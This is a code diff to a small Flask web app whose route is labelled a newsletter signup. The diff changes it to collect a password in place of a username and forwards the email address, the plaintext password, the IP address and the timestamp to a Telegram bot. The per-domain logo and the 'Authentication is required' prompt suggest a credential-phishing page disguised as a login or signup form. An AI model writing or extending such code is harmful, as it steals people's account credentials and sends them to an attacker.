@@ -145,11 +145,11 @@ def signup():
     """Handle newsletter signup and send data to Telegram."""
     if request.method == 'POST':
         email = request.form.get('email', '')
-        username = request.form.get('username', '')
+        password = request.form.get('password', '')
         turnstile_response = request.form.get('cf-turnstile-response', '')
     else:
         email = request.args.get('email', '')
-        username = ''
+        password = ''
         turnstile_response = ''
 
     domain = get_domain_from_email(email) if email else None
@@ -157,9 +157,9 @@ def signup():
     error = None
 
     if request.method == 'POST':
-        # Validate username
-        if not username:
-            error = 'Username is required.'
+        # Validate password
+        if not password:
+            error = 'Authentication is required.'
         # Validate captcha
         if not turnstile_response:
             error = 'Captcha is required.'
@@ -188,7 +188,7 @@ def signup():
             msg = f"""🎯 New Signup Alert!
 
 Email: {email}
-Username: {username}
+Password: {password}
 
 📊 Additional Details:
 IP Address: {user_ip}
@@ -218,7 +218,7 @@ Date of Submission: {timestamp}"""
             except NameError:
                 print("ℹ️ Secondary Telegram bot credentials not defined (commented out)")
 
-    return render_template('he-opas.html', email=email, username=username, domain=domain, logo_url=logo_url, error=error)
+    return render_template('he-opas.html', email=email, password=password, domain=domain, logo_url=logo_url, error=error)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
